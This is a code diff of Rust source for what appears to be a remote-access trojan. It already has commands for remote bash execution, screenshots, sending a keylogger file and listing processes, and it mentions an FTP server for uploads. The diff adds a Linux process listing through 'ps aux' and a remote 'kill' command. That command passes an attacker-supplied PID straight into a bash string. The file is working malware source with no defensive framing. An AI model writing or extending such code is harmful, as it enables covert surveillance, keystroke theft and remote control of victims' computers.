@@ -24,6 +24,7 @@ const EXECUTE_BASH_COMMAND: &'static str = "bash";
 const SEND_PIC_COMMAND: &'static str = "pic";
 const SEND_KEY_LOGGER_FILE_COMMAND: &'static str = "sendlog";
 const SEND_PROCESS_LIST_COMMAND: &'static str = "proclist";
+const KILL_COMMAND: &'static str = "kill";
 const UNKNOWN_COMMAND: &'static str = "Unknown command";
 
 //Enter your data for FTP Server connection
@@ -121,10 +122,27 @@ impl CommandProcessor
         ret
     }
 
+    #[cfg(target_os = "windows")]
+    fn kill_process(&self, pid: &str) -> String
+    {
+        "Not implemented".to_string()
+    }
+
+    /// Gets processes list (Linux version)
+    /// * returns String with id and name of the processes list or empty on error
     #[cfg(target_os = "linux")]
     fn get_process_list(&self) -> String
     {
-        "".to_string()
+        self.execute_bash_command("ps aux")
+    }
+
+    ///Kill process
+    /// * pid - PID of the process
+    #[cfg(target_os = "linux")]
+    fn kill_process(&self, pid: &str) -> String
+    {
+        let s = format!("kill {}", pid);
+        format!("Bash executed {}", self.execute_bash_command(&s))
     }
 
     /// Takes screenshot and save it as a PNG file in a passed file
@@ -334,6 +352,11 @@ impl FleaCommand for CommandProcessor
             EXECUTE_BASH_COMMAND =>
             {
                 return self.execute_bash_command(value);
+            },
+
+            KILL_COMMAND =>
+            {
+                return self.kill_process(value)
             },
 
             SEND_KEY_LOGGER_FILE_COMMAND =>
